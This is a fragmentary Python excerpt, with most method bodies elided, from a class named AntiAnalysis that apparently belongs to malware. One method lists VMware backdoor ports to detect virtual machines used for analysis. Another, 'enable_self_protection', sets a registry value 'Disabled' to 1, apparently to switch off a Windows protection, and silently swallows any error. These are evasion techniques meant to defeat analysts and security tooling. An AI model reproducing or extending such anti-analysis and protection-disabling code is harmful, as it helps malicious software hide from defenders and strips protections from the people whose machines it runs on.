...
class AntiAnalysis:
    ...
    def _check_vm_ports(self):
        """Check for VM backdoor ports"""
        vm_ports = [0x5658, 0x5659, 0x565A, 0x565B]  # Common VM ports
    ...
    def enable_self_protection(self):
        """Enable various self-protection mechanisms"""
        ...
        try:
            ...
            win32api.RegSetValueEx(key, "Disabled", 0, win32con.REG_DWORD, 1)
        except:
            pass
